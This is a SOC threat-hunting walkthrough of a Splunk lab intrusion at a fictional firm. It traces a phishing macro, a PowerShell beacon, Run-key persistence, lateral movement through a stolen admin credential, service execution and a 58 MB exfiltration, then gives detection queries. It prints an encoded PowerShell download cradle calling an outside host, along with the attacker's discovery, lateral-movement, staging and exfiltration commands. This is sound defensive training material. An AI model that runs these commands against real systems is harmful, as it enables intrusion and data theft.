# Splunk Threat Hunt — Walkthrough

Brightfield Partners (`brightfield.local`), 9 hosts, 2026-08-13 → 2026-08-19. One workstation gets phished, the attacker beacons out over PowerShell, plants persistence, steals an admin credential, moves to the file server over SMB, and exfiltrates 58 MB of finance and PII data. Every SPL query below is the actual query I ran, in the order I ran it, against `index=hunt_lab`.

**Org:** Brightfield Partners · domain `brightfield.local`
**Window:** 7 days, 2026-08-13 → 2026-08-19 (Asia/Jerusalem). Incident lands on day 4–5.
**Sources:** `fortigate`, `sysmon:json`, `wineventlog:security:json`, `wineventlog:system:json`, `powershell:json`

| Hostname             | IP            | Role                 | OS            |
|---                   |---            |---                   |   ---           |
| FGT-EDGE01           | 10.42.1.176   | firewall             | FortiOS 7.4       |
| DC01                 | 10.42.5.200   | domain controller    | Windows Server 2022  |
| FS01                 | 10.42.5.132   | file server          | Windows Server 2022     |
| WKS01                | 10.42.20.85  | workstation           |  Windows 10 22H2        |
| WKS02                | 10.42.20.225 | workstation           | Windows 11 23H2         |
| WKS03                | 10.42.20.33  | workstation           | Windows 11 23H2         |
| WKS04                | 10.42.20.170 | workstation           | Windows 11 23H2         |
| WKS05                | 10.42.20.117 | workstation           | Windows 10 22H2         |
| WKS06                | 10.42.20.176 | workstation           | Windows 11 23H2         |


## kick-start:

```spl
index=hunt_lab | stats count by sourcetype
```

**831,679 events in total: fortigate ~348K, sysmon ~131K, windows_security ~179K, windows_system ~114K, powershell ~58K.**

## What each source is actually good for:

- **fortigate** — Fortinet NGFW perimeter traffic. Volume, direction, destination.
- **sysmon:json** — process execution, network connections, file writes, registry changes, DNS. Only useful read as chains and timelines, not single events.
- **wineventlog:security:json** — logons and process-creation audit.
- **wineventlog:system:json** — services, drivers, hardware, start/stop.

### Asset discovery

```spl
index=hunt_lab sourcetype=sysmon:json
| stats count by ComputerName
| sort 0 - count
```

8 ComputerNames that are hosts in the local network,  Nothing unusual in terms of volume.

## Add identity fields:

```spl
index=hunt_lab sourcetype=sysmon:json
| stats count by SourceIp, User, ComputerName, host
| sort 0 - count
```

| SourceIp | User | ComputerName | host | count |
|---           |---        |---                                  |---         |---   |
| 10.42.20.176 | sfriedman | WKS06.brightfield.local             | wks06      | 7696 |
| 10.42.20.117 | oshapiro | WKS05.brightfield.local              | wks05      | 7670 |
| 10.42.5.132  | SYSTEM    | FS01.brightfield.local              | fs01       | 7616 |
| 10.42.5.200  | SYSTEM    | DC01.brightfield.local              | dc01       | 7538 |
| 10.42.20.225 | nmizrahi | WKS02.brightfield.local              | wks02      | 7500 |
| 10.42.20.170 | mazoulay | WKS04.brightfield.local              | wks04      | 7446 |
| 10.42.20.33  | nsasson   | WKS03.brightfield.local             | wks03      | 7496 |
| 10.42.20.85  | yhar-even | WKS01.brightfield.local             | wks01      | 7246 |
| 10.42.20.85  | BRIGHTFIELD\yhar-even | WKS01.brightfield.local | wks01      | 60   |
| 10.42.5.132  | adm-mrogers | FS01.brightfield.local            | fs01       | **2**|

### Two things stand out:

1. `adm-mrogers` on FS01, 2 sysmon events total — a privileged looking account with almost no footprint.
2. WKS01's user shows up in two formats — `yhar-even` (7,246) and `BRIGHTFIELD\yhar-even` (60). Sysmon populates the `User` field differently per event code, so this split means WKS01 has **event classes none of the other hosts have**. 

### The null-field trap

```spl
index=hunt_lab sourcetype=sysmon:json host=wks01
| stats count by EventCode
```

> This returns far more events than a previous query i ran with more fieldnames. `stats count by` on multiple fields drops any event where *any one* of those fields is null — on mixed-schema data like Sysmon, where field presence varies by event code, that means my host-inventory query was silently excluding whole event classes. Same failure mode as a typo field name: no error, just a wrong answer.

WKS01 breakdown:

| EventCode     | Count   | What it is                            |
|---            |---      |---                                    |
| 1             | ~12,525 | Process Create — much baseline noise  |
| 3             | 3653    | Network Connect                       |
| 11            | 2       | **File Create**                       |
| 13            | 1       | **Registry Value Set**                |
| 22            | 1       | **DNS Query**                         |

Four rare events. That's where i focus first.

---

## Stage 1 — unfolding WKS01 

```spl
index=hunt_lab sourcetype=sysmon:json host=wks01 EventCode IN (11,13,22)
| table _time EventCode Image TargetFilename TargetObject Details QueryName QueryResults User ProcessGuid
| sort _time
```

**11:00:54 — macro file drop.** (EventCode 11) `OUTLOOK.EXE` writes into the attachment cache:

```
C:\Users\yhar-even\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\812F1951\Vendor_Statement_Update.docm
```

A `.docm` carries embedded VBA — unlike `.docx` it can run code. `yhar-even` opened a macro doc from email.

> **T1566.001** — Phishing: Spearphishing Attachment

**11:02:26 — DNS resolution.** (EventCode 22) `powershell.exe` resolves `static-assets-cache.net` → **203.0.113.133**. The name reads like a benign CDN cache; the IP sits in TEST-NET-3, the documentation range this lab uses for external infrastructure.

## **14:17:13 — persistence.** (EventCode 13) Registry value set:

```
HKU\yhar-even\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateHelper
  → C:\Users\yhar-even\AppData\Roaming\Microsoft\Windows\WindowsUpdateHelper.exe
```

A Run key means it fires on every logon. Microsoft never ships core update binaries into a user's `AppData\Roaming` — real update files live in `System32` or `Windows\Servicing`. AppData is a classic malware default because it needs no admin rights.

> **T1547.001** — Boot or Logon Autostart Execution: Registry Run Keys
> **T1036.005** — Masquerading: Match Legitimate Resource Name or Location

**The pivot key: PID 13316, ProcessGuid `{fc14a32e-6a82c004-00000005}`.** The DNS query at 11:02:26 and the persistence write at 14:17:13 carry the same GUID — one process, alive **3h15m**. Close PowerShell and reopen it, you get a new GUID, so this one is a continuous session.

```spl
index=hunt_lab sourcetype=sysmon:json ProcessGuid="{fc14a32e-6a82c004-00000005}"
| table _time EventCode Image CommandLine DestinationIp DestinationPort TargetFilename TargetObject QueryName
| sort _time
```

## The launching event at 2026-08-17 11:02:12:

```
CommandLine:       powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwB1AHAAZABhAHQAZQAuAC8AJwApAA==
ParentImage:       C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
ParentCommandLine: WINWORD.EXE
ParentProcessGuid: {fc14a32e-6a82bfe0-00000003}
ParentProcessId:   7255
ProcessGuid:       {fc14a32e-6a82c004-00000005}
ProcessId:         13316
User:              BRIGHTFIELD\yhar-even
IntegrityLevel:    Medium
LogonId:           0xa35548
```
`ParentImage: WINWORD.EXE → powershell.exe` is consistent with macro
execution. The `-EncodedCommand` payload is base64 over UTF-16LE; decoded
via CyberChef (From Base64 → Decode text, UTF-16LE (1200)):

    IEX (New-Object Net.WebClient).DownloadString('https://update./')

A download cradle: pulls a remote script into memory and executes it via
Invoke-Expression. ATT&CK names this exact construct as a T1105 procedure.
No payload is written to disk, consistent with the absence of a file-write
event until three hours later. The URL is truncated in the source
telemetry. the DNS event resolves the full target.

> **T1059.001** (PowerShell) · **T1105** (Ingress Tool Transfer) ·
> **T1027.010** (Command Obfuscation, *Stealth* TA0005)
> Mapped against ATT&CK Enterprise v19.2.

| Flag | Meaning | Why it matters |
|---|---|---|
| `-nop` | NoProfile | Skips profile scripts — avoids anything that might log or interfere |
| `-w hidden` | WindowStyle Hidden | No visible window |
| `-enc` | EncodedCommand | Base64 — defeats naive string matching on `DownloadString` |

Also worth noting: `IntegrityLevel: Medium` — standard user, not admin.

---

## Office app → script engine

The relationship, not an indicator: Office as parent, script engine as child. Any macro-based initial access has to cross that boundary to execute code:

```spl
index=hunt_lab sourcetype=sysmon:json EventCode=1
| where match(ParentImage, "(?i)(WINWORD|EXCEL|POWERPNT|OUTLOOK)\.EXE$")
  AND match(Image, "(?i)(powershell|cmd|wscript|cscript|mshta|rundll32)\.exe$")
'''

- got two hits:

1. 
ComputerName:      WKS06.brightfield.local
CommandLine:       cmd.exe /c copy "Monthly_Report.pdf" "C:\Shares\Finance\Archive\"
CurrentDirectory:  C:\Shares\Finance\
ParentCommandLine: "EXCEL.EXE" "C:\Shares\Finance\Monthly_Report_Macro.xlsm"
ProcessGuid:       {41fb6a20-6a80427b-00000002}
User:              BRIGHTFIELD\sfriedman
```

I pivoted on the Excel ProcessGuid to see everything downstream: one child `cmd.exe` archiving a report locally, no network connections, no file drops outside the share, no registry writes. Chain terminates. Benign.

## 2.  same powershell event we previously found :

```
CommandLine:       powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwB1AHAAZABhAHQAZQAuAC8AJwApAA==
ParentImage:       C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
ParentCommandLine: WINWORD.EXE
ParentProcessGuid: {fc14a32e-6a82bfe0-00000003}
ParentProcessId:   7255
```


### Ruling out the false positive:

Same detection logic, opposite verdicts. One chain was macro → PowerShell → encoded download cradle → external DNS → persistence. The other was macro → cmd → local file copy → nothing. 
That's why this is a hunting query, not an alert.

---

### Stage 2 — hunting the remote ip (203.0.113.133) from the DNS resolution event at 11:02:26 — where `powershell.exe` resolves `static-assets-cache.net`:

> Field names first - a wrong field name doesn't error in SPL, it returns empty, and empty looks like clean. This is a custom `fortigate` sourcetype, no CIM add-on, so I can't assume normalized field names.

```spl
index=hunt_lab sourcetype=fortigate
| fieldsummary
| table field distinct_count mean values
```
**all fortigate events.**

```spl
index=hunt_lab sourcetype=fortigate dstip=203.0.113.133
```
**30 events.**


```spl
index=hunt_lab sourcetype=fortigate dstip=203.0.113.133
| stats count sum(sentbyte) as sent sum(rcvdbyte) as rcvd min(_time) as first max(_time) as last by srcip
| eval sent_mb=round(sent/1048576,2), rcvd_mb=round(rcvd/1048576,2), ratio=round(sent/(rcvd+1),1)
| convert ctime(first) ctime(last)
| table srcip count sent_mb rcvd_mb ratio first last
```

This query aggregates every firewall session to the 203.0.113.133 into one row per internal IP, showing how much data each one sent and received, over how many sessions, and across what time window.

## Two hosts, two completely different shapes:

|           | WKS01 (10.42.20.85) | FS01 (10.42.5.132) |
|---         |---                   |---               |
| Sessions   | 29                   | **1**            |
| Sent       | ~40 KB               | **58.25 MB**     |
| Received   | ~70 KB               | 2.5 KB           |
| Ratio      | ~0.5 (inbound-heavy) | **~23524:1**     |
| Window     | 11:02:33 → 14:14:45  | 15:02:01 only    |

- **WKS01 = command and control.** 29 sessions over three hours, tiny volumes, more received than sent. Ratio below 1 looks more like a beacon for tasks, not a thief.
- **FS01 = strong exfiltration indicator .** One session, one timestamp, 58.25 MB out. A single upload of a prepared archive.


I ran this to check whether 203.0.113.133 ever appeared as a source, to see if the attacker had initiated any session inward:

```spl
index=hunt_lab sourcetype=fortigate (srcip=203.0.113.133 OR dstip=203.0.113.133)
| eval direction=if(dstip=="203.0.113.133","outbound","inbound")
| stats count by direction
```

**Nothing came back as inbound, and that is the finding rather than a gap.**
FortiGate records source and destination by session direction, so the initiator is always srcip. 
An attacker-initiated connection would have shown 203.0.113.133 there. It never does- the implant dials out, and the operator's replies ride back down connections WKS01 opened. 
Direction alone therefore tells me nothing here, which is why the sent/received ratio is what separates C2 from exfil.

same destination, opposite traffic shapes  one host controlled, the other emptied. lets confirm on the endpoint side:

```spl
index=hunt_lab sourcetype=sysmon:json host=fs01 EventCode=3 DestinationIp=203.0.113.133
```
One network event on FS01, at    UtcTime: 2026-08-17 12:02:01.000 . Consistent.

**summary so far:**
Splitting the traffic towards "203.0.113.133" returned two internal hosts, and only one of them had a delivery story. WKS01 had the attachment, the cradle, and three hours of beaconing. 
FS01 had a connection to the same infrastructure and nothing explaining it - no suspicious Office activity, no second phishing attempt, and no inbound session that could have reached it directly. 
A second host talking to the same C2 with no independent entry point means the operator probably moved to it from inside, and moving to a Windows file server means authenticating to it. 
That authentication has to be recorded on FS01 as a logon event, so I went looking for one from 10.42.20.85 in the window between WKS01 going quiet and FS01 going loud. 
The rare admin account adm-mrogers — 2 events out of 131K+ events in Sysmon, both on FS01 — told me which account to expect before I ran the query.
---

## Stage 3.1 — What logon reached FS01?.

***Searching for all windows security logs EventID's to surface any logons/authentication and process-creation audit on FS01 :***

```spl
index=hunt_lab sourcetype=wineventlog:security:json ComputerName="FS01*" 
```
**10 events:**

4688	3	30%	
4624	2	20%	
4634	2	20%	
4647	1	10%	
4672	1	10%	
5140	1	10%

```spl
index=hunt_lab sourcetype=wineventlog:security:json ComputerName="FS01*"
| eval user=coalesce(TargetUserName,SubjectUserName)
| eval logon_id=coalesce(TargetLogonId,SubjectLogonId)
| eval detail=coalesce(CommandLine,ShareName,PrivilegeList)
| table _time EventCode user logon_id LogonType AuthenticationPackageName IpAddress WorkstationName ParentProcessName detail
| sort _time 
```

**same 10 events with user as "adm-mrogers" but cleaner data.**

### Timeline

Time	    Event	Detail
14:47:56	4624	Type 3, NTLM, from 10.42.20.85 / WKS01, adm-mrogers
14:47:56	4672	SeDebugPrivilege, 
14:47:57	5140	\\FS01\ADMIN$, AccessMask 0x1
15:03:01	4647 / 4634	Session ends, logon ID 0xf33c9c

**findings summary:**
The operator authenticated to FS01 from WKS01 (10.42.20.85) as the privileged account adm-mrogers over NTLM, receiving a Type 3 network logon and SeDebugPrivilege at 14:47:56. One second later the same session accessed \\FS01\ADMIN$, and ten seconds after that services.exe spawned cmd.exe — the signature of a possible remotely installed service used for execution (T1569.002). 
Within the same 15-minute session the operator enumerated identity and local administrators, pulled the Finance$ share to C:\Windows\Temp\svc_stage with Robocopy, and compressed it to sys_diag.zip. The session closed cleanly at 15:03:01. All eight events share logon ID 0xf33c9c, tying authentication, privilege, share access, and every process back to a single intrusion session.


### 3.2 — What initiated it?

## a logon accepted on FS01 means credentials were supplied on WKS01, and Windows records that in event 4648 which carries ProcessName. 
ill look for a process that could have tried to log on to an account by explicitly typing out that account's username and password:

```spl
index=hunt_lab sourcetype=wineventlog:security:json ComputerName="WKS01*" EventCode=4648
| table _time SubjectUserName TargetUserName TargetServerName ProcessName LogonGuid
| sort _time
```
_time	                 |      SubjectUserName	       |     TargetUserName |	TargetServerName	| ProcessName	
2026-08-17 14:47:34	   |       BRIGHTFIELD\yhar-even	|     adm-mrogers	  |      FS01	         |   net.exe


### 22 seconds later, FS01 accepts it:

```
14:47:56  FS01  4624  Type 3, NtLmSsp, from 10.42.20.85
14:47:56  FS01  4672  special privileges assigned
14:47:57  FS01  5140  ShareName=\\FS01\ADMIN$  ObjectType=File  IpAddress=10.42.20.85
```

            | WKS01-4648	    |WKS01-Sysmon EventID 1
Time	      | 14:47:34	          |14:47:34
Process	    | net.exe	            |net.exe
Target	    | FS01	              | \\FS01\ADMIN$
Account	    | adm-mrogers	        | /user:BRIGHTFIELD\adm-mrogers


we had a logon on FS01 and a compromised session on WKS01, with nothing linking them but a source IP and a timestamp. Rather than guess at a mechanism, I went back to the pivot that had carried the investigation so far - PowerShell {fc14a32e-6a82c004-00000005}, alive since 11:02:12 — and pulled everything it did or spawned. If the operator moved laterally, they moved from somewhere, and that session was the only thing on WKS01 under their control.

```spl
index=hunt_lab sourcetype=sysmon:json
| search ProcessGuid="{fc14a32e-6a82c004-00000005}" OR ParentProcessGuid="{fc14a32e-6a82c004-00000005}"
| table _time EventCode Image CommandLine User IntegrityLevel TargetObject DestinationIp TargetFilename
| sort _time
```

#### The result is the full operator session, and the lateral movement turns out to be the end of it rather than an isolated event.

Beaconing runs to 14:14:45 - eleven connections to 203.0.113.133 at 6–8 minute intervals - and then stops. At 14:17:13 the Run-key persistence and the WindowsUpdateHelper.exe drop land in the same second. From 14:21:47 the character of the session changes completely: no more network callbacks, a series of interactive discovery commands instead.

#### commands:      
14:21:47  cmd.exe /c whoami /all
14:25:20  systeminfo.exe
14:26:28  ipconfig.exe /all
14:29:57  net.exe user /domain
14:32:25  net.exe group "Domain Admins" /domain
14:33:40  nltest.exe /dclist:brightfield.local
14:36:24  net.exe view \\FS01
14:38:42  tasklist.exe /v

###### Host, then domain, then a single named server, then a process check — widening and then narrowing, with irregular one-to-four-minute gaps between commands. That cadence is a person reading output and deciding what to run next, not a script executing a list. It also answers a question I had been treating as settled: FS01 wasn't chosen from the C2 side, it was chosen here. net user /domain and nltest /dclist mapped the domain, and net.exe view \\FS01 at 14:36:24 enumerated that specific file server's shares eleven minutes before anything authenticated to it.

**Then, at 14:47:34, the last event in the session:**

```
net.exe use \\FS01\ADMIN$ /user:BRIGHTFIELD\adm-mrogers *
```

Twenty-two seconds before FS01's 4624 - mapping the share the 5140 recorded, under the account the logon carried, from the process that had been beaconing for three hours. The chain closes on itself.

Two details worth flagging. Every command in this session runs at IntegrityLevel: Medium as yhar-even: the operator never elevated on WKS01 at all, which is why a stolen domain credential was the path forward rather than local escalation. And the 8m52s between 'tasklist /v' and 'net.exe' use is the longest silence in the session and the only interval with no telemetry.

whatever produced adm-mrogers's credential happened there, and it left nothing in Sysmon. That narrows my unresolved credential-access gap from a three-hour window to nine minutes.

***T1082 System Information Discovery - T1087.002 Domain Account Discovery - T1018 Remote System Discovery - T1057 Process Discovery***


3.3 Everything WKS01 logged in the window, no sourcetype filter

```spl
index=hunt_lab host=wks01
earliest="08/17/2026:10:58:00" latest="08/17/2026:14:48:00"
| stats count by sourcetype, EventCode
| sort sourcetype, - count
```


sourcetype                |	EventCode |    count  |
powershell:json           |     4104    |    474    |
sysmon:json	              |      1	    |     745   |
sysmon:json	              |      3	    |     252   | 
sysmon:json	              |      11	    |     2     |
sysmon:json	              |      13	    |     1     |
sysmon:json	              |     22	    |     1     |
wineventlog:security:json |	4624	    |    902    |
wineventlog:security:json |	4634	    |    290    |
wineventlog:security:json |	4625	    |    87     |
wineventlog:security:json |	4688      |    12     |
wineventlog:security:json |	4648	    |    1      |
wineventlog:system:json	  |    7036	    |   800     |

****powershell:json eventcode: 4104 is my first place to look.****
so i zoom out to run a wide search to avoid "tunnel-visioning" at a short time frame:

```spl
index=hunt_lab sourcetype=powershell:json host=wks01 EventCode=4104
earliest="08/17/2026:10:00:00" latest="08/17/2026:14:48:00"
| stats count min(_time) as first max(_time) as last by ScriptBlockText
| convert ctime(first) ctime(last)
| sort first
```
>Six commands on repeat - Get-EventLog System, Get-ADUser | Export-Csv, Copy-Item template.xlsx, Restart-Service Spooler, Get-Service, Get-ChildItem C:\Shares\Finance - identical arguments, no progression. As a cluster they map to four Discovery sub-techniques, so I aggregated by command text across 10:00 -> 14:48 instead of reading chronologically: frequency is what separates a loop from a person. Each returns 89–112 executions, all running by 10:06 - an hour before the attachment opened. Scheduled automation.

**Exactly one block is unique:**
```
11:02:12  IEX (New-Object Net.WebClient).DownloadString('https://static-assets-cache.net/update.'); Start-Sleep -Seconds 2
```

***Count of 1. The decoded -enc payload executing, with the full URL Sysmon's CommandLine had truncated. The trailing Start-Sleep is the beacon primitive. No other powershell events - the second stage came down through this cradle and ran in memory.***


### 3.4   Correlating the chain from Security audit

Sysmon gave me the operator session through ProcessGuid. Windows process-creation auditing records the same activity independently, so I pulled 4688 across the full session — if the two sources disagree, one of them is wrong and I need to know before I write anything up.

```spl
index=hunt_lab sourcetype=wineventlog:security:json host=wks01 EventCode=4688
earliest="08/17/2026:10:58:00" latest="08/17/2026:14:48:00"
| table _time ParentProcessName SubjectUserName CommandLine
| sort _time
```
*** Twelve events, all intrusion, no baseline - and it reaches two steps further back than Sysmon did:***

```
11:00:54  explorer.exe   → OUTLOOK.EXE
11:01:36  OUTLOOK.EXE    → WINWORD.EXE /n "...\Content.Outlook\812F1951\Vendor_Statement_Update.docm"
11:02:12  WINWORD.EXE    → powershell.exe -nop -w hidden -enc
14:21:47  powershell.exe → cmd.exe /c whoami /all
14:25:20  powershell.exe → systeminfo.exe
14:26:28  powershell.exe → ipconfig.exe /all
14:29:57  powershell.exe → net.exe user /domain
14:32:25  powershell.exe → net.exe group "Domain Admins" /domain
14:33:40  powershell.exe → nltest.exe /dclist:brightfield.local
14:36:24  powershell.exe → net.exe view \\FS01
14:38:42  powershell.exe → tasklist.exe /v
14:47:34  powershell.exe → net.exe use \\FS01\ADMIN$ /user:BRIGHTFIELD\adm-mrogers *
```

**notes so far**
One clean chain, from the mail client to the stolen credential. Stage 1 pieced the macro execution together - the Outlook cache write, plus WINWORD as PowerShell's parent. Here it's recorded outright: Outlook opening WINWORD on that exact attachment. Every process runs as BRIGHTFIELD\yhar-even, and nothing on WKS01 ever elevates. The operator stayed a normal user on this host, which is why they needed someone else's admin account to reach FS01.

The 8m52s between tasklist /v and net.exe use is empty here too. Two independent sources agree on the boundary.(The GUID pivot (sysmon:json, EventCode 1, filtered on {fc14a32e-6a82c004-00000005}) shows tasklist.exe /v at 14:38:42 and net.exe use at 14:47:34 with nothing between them. The 4688 query (wineventlog:security:json, no GUID filter at all) returns the same two commands with the same gap.)

>Collection note: this dataset populates ParentProcessName and CommandLine on 4688; NewProcessName, CreatorProcessName and TokenElevationType are empty, so I dropped them from the table. CreatorProcessName is the field that would attribute a process Sysmon's GUID chain missed, so that cross-check isn't available.




### Does adm-mrogers have a baseline?

```spl
index=hunt_lab sourcetype=wineventlog:security:json TargetUserName="adm-mrogers"
| stats count min(_time) as first max(_time) as last values(ComputerName) as hosts values(IpAddress) as src_ips values(LogonType) as types by EventCode
| convert ctime(first) ctime(last)
```

`adm-mrogers` appears exactly twice in the whole dataset: the NTLM network logon from WKS01 during the incident, and one RDP session (`LogonType 10`) from WKS06 (10.42.20.176) two days later, on 08-19. Neither is a baseline — this account has **no routine usage in the window at all**, so there's nothing to compare the incident against except itself.

---

## Stage 4 - Remote execution via service install

```spl
index=hunt_lab sourcetype=wineventlog:system:json ComputerName="FS01*" EventCode=7045
earliest="08/17/2026:14:45:00" latest="08/17/2026:15:00:00"
```

```
14:48:07  ServiceName: WindowsUpdateSvc
          ImagePath:   C:\Windows\Temp\wuhelper.exe
          ServiceType: user mode service
          StartType:   demand start
          AccountName: adm-mrogers
```

| Field                                | Why it's an indicator                                       |
|         ---                 ---      |         ---                                ---               |
| `WindowsUpdateSvc`                   | masquerades as the real `wuauserv`                            |
| `C:\Windows\Temp\wuhelper.exe`       |legitimate ones live in System32 or Program Files not Temp      |
| `demand start`                       | not auto-start - triggered once, then discarded                 |
| `adm-mrogers`                        | the compromised account, 11 seconds after the ADMIN$ share access |

> **T1543.003** - Create or Modify System Process: Windows Service · **T1569.002** - System Services: Service Execution · **T1036.004** - Masquerade Task or Service

**Baseline contrast - the only other 7045 in seven days is `AdobeARMservice` on WKS04, `LocalSystem`, auto-start, path under Program Files. Same event code, opposite everything.**

**Same second (14:48:07), the service's first command runs:**

```spl
index=hunt_lab sourcetype=wineventlog:security:json ComputerName="FS01*" EventCode=4688
earliest="08/17/2026:14:48:00" latest="08/17/2026:14:48:30"
```

```
cmd.exe /c whoami && net localgroup administrators
ParentProcessName: services.exe
```

`services.exe` as the parent - launched by the Service Control Manager, not an interactive session. Confirms identity and local admin membership before doing anything else.

> **T1033** - System Owner/User Discovery · **T1069.001** - Permission Groups Discovery: Local Groups

---

## Stage 5 — Collection, staging, exfiltration on FS01

```spl
index=hunt_lab sourcetype=sysmon:json host=fs01 EventCode=1
| where match(Image,"(?i)robocopy\.exe") OR match(CommandLine,"(?i)(robocopy|compress-archive)")
| table _time Image ParentImage CommandLine User
| sort _time
```

**14:52:03**

```
robocopy.exe \\FS01\Finance$ C:\Windows\Temp\svc_stage /E /NFL
```

`Finance$` is the hidden administrative share — exactly why the ADMIN$ logon five minutes earlier mattered. `/E` recurses everything including empty folders; `/NFL` suppresses Robocopy's own per-file log, cutting down local forensic residue. Signed native binary, no tooling introduced.

> **T1005** - Data from Local System · **T1039** - Data from Network Shared Drive

**14:52:08 → 14:55:24 — 14 files staged** into `C:\Windows\Temp\svc_stage\`:

```
Vendor_Contracts.pdf · Q2_Financials.xlsx · Customer_Export.csv · HR_Compensation_Bands.xlsx ·
Tax_Filing_2025.pdf · Client_PII_Export.csv · Bank_Wire_Instructions.docx · Audit_Findings_Internal.docx ·
AP_Ledger.xlsx · Board_Minutes_June.docx · M&A_NDA_Draft.docx · Insurance_Claims_Q2.xlsx ·
Payroll_Master_2026.xlsx · Budget_FY27_Draft.xlsx
```

Payroll, banking, board minutes, an NDA draft, PII exports — a targeted pull, not a bulk sweep. `svc_stage` under `Windows\Temp` is deliberate camouflage: reads like a service working directory, and Temp is noisy enough to get ignored.

> **T1074.001** — Local Data Staging

**14:57:43**

```
powershell.exe -nop -c "Compress-Archive -Path C:\Windows\Temp\svc_stage -DestinationPath C:\Windows\Temp\sys_diag.zip"
```

Archive written 14:57:51. `-nop` matches the flag habit from the WKS01 launch — same operator. `sys_diag.zip` follows the same naming trick as `WindowsUpdateHelper.exe` and `wuhelper.exe`: everything dressed up as system maintenance.

> **T1560.001** - Archive Collected Data via Utility · **T1036** - Masquerading

**15:02:01 — exfiltration.**

```spl
index=hunt_lab sourcetype=sysmon:json host=fs01 EventCode=3 DestinationIp=203.0.113.133
| table _time Image ProcessId ProcessGuid DestinationPort
```

`powershell.exe`, PID 33742, `{f6196639-6a82f737-00000006}` → 203.0.113.133:443. FortiGate side of the same session: **61,077,316 bytes sent / 2,596 received — one session, ~58 MB, ratio over 23,000:1**, port 443 blending in with ordinary HTTPS.

> **T1041** - Exfiltration Over C2 Channel

15:03:01 — 4647/4634 logoff, session closed.

---

## Confirmed timeline

```
2026-08-17
11:00:54  WKS01  OUTLOOK.EXE writes Vendor_Statement_Update.docm to INetCache
11:02:12  WKS01  WINWORD.EXE → powershell.exe -nop -w hidden -enc  (PID 13316)
11:02:26  WKS01  DNS query static-assets-cache.net → 203.0.113.133
11:02:33  WKS01  beaconing begins — 29 sessions total, inbound-heavy
14:14:45  WKS01  beacon goes quiet
14:17:13  WKS01  Run key WindowsUpdateHelper → AppData\Roaming\...\WindowsUpdateHelper.exe
14:47:34  WKS01  net.exe use \\FS01\ADMIN$ /user:adm-mrogers *  →  4648 explicit creds, same second
14:47:56  FS01   4624 — NTLM (NtLmSsp) Type 3 logon accepted from 10.42.20.85
14:47:56  FS01   4672 — special privileges assigned
14:47:57  FS01   5140 — ADMIN$ share accessed from 10.42.20.85
14:48:07  FS01   7045 — service WindowsUpdateSvc → C:\Windows\Temp\wuhelper.exe (demand start, adm-mrogers)
14:48:07  FS01   4688 — cmd.exe /c whoami && net localgroup administrators (parent: services.exe)
14:52:03  FS01   robocopy \\FS01\Finance$ → C:\Windows\Temp\svc_stage /E /NFL
14:52:08  FS01   14 files staged  →
14:55:24  FS01   ...staging complete
14:57:43  FS01   Compress-Archive → C:\Windows\Temp\sys_diag.zip
14:57:51  FS01   archive written
15:02:01  FS01   58 MB → 203.0.113.133:443
15:03:01  FS01   4634 — logoff, session closed

2026-08-19
17:36:41  FS01   adm-mrogers RDP (LogonType 10) from WKS06 / 10.42.20.176 — checked, benign
```


---

## Detection package

### Alert 1 - Office application spawns a script interpreter

Office spawning an interpreter isn't malicious by itself.

## splunk query:

```sql
index=hunt_lab sourcetype=sysmon:json EventCode=1
| where match(ParentImage, "(?i)\\\\(WINWORD|EXCEL|POWERPNT|MSACCESS|VISIO|OUTLOOK|ONENOTE)\\.EXE$")
    AND match(Image, "(?i)\\\\(powershell|pwsh|cmd|wscript|cscript|mshta|rundll32|regsvr32|certutil|bitsadmin|msiexec)\\.exe$")
| eval score=0
| eval score=if(match(CommandLine,"(?i)\\s-(enc|encodedcommand|ec|e)\\s+[A-Za-z0-9+/=]{20,}"), score+4, score)
| eval score=if(match(CommandLine,"(?i)(downloadstring|downloadfile|invoke-webrequest|invoke-restmethod|\\biwr\\b|\\bwget\\b|bitsadmin|start-bitstransfer)"), score+4, score)
| eval score=if(match(CommandLine,"(?i)(frombase64string|\\biex\\b|invoke-expression|reflection\\.assembly)"), score+3, score)
| eval score=if(match(CommandLine,"(?i)(https?|ftp)://"), score+2, score)
| eval score=if(match(CommandLine,"(?i)(-w(indowstyle)?\\s+hidden|-nop\\b|-noprofile\\b|-ep\\s+bypass)"), score+2, score)
| eval score=if(match(CommandLine,"(?i)\\\\(appdata|programdata|windows\\\\temp|users\\\\public)\\\\"), score+2, score)
| where score>=4
| eval stage="initial_access", mitre="T1566.001,T1204.002,T1059.001,T1027"
| table _time host User ParentImage Image CommandLine score stage mitre
```
**logic:**
Aim: an Office application spawning a script interpreter or LOLBin. That parent-child pair is rare in normal use and is the standard macro-execution signature.
**ATT&CK:** T1566.001, T1204.002, T1059.001, T1027

### Alert 2 — Autostart registry key in a user-writable path

## splunk query:

```sql
index=hunt_lab sourcetype=sysmon:json EventCode=13
| where match(TargetObject,"(?i)\\\\CurrentVersion\\\\(Run|RunOnce|RunServices)")
   AND match(Details,"(?i)\\\\(AppData|ProgramData|Users\\\\Public|Windows\\\\Temp|\\$Recycle\\.Bin)\\\\")
| eval stage="persistence", mitre="T1547.001,T1036.005"
| table _time host User Image TargetObject Details stage mitre
```
**logic:**

Legit installers register autostart from Program Files or System32. A Run key into a user profile needs no admin rights - it's the default choice when the actor only has medium integrity. 
One matching event in the whole dataset.

**ATT&CK:** T1547.001 - Registry Run Keys / Startup Folder (Tactic: Persistence / Privilege Escalation) , T1036.005 - Masquerading: Match Legitimate Name or Location (Tactic: Defense Evasion).

### Alert 3 — Anomalous service installation

## splunk query:

```sql
index=hunt_lab sourcetype=wineventlog:system:json EventCode=7045
| eval fname=lower(mvindex(split(ImagePath,"\\"),-1))
| eval score=0
| eval score=if(NOT match(ImagePath,"(?i)^[a-z]:\\\\(windows\\\\system32|program files)"), score+3, score)
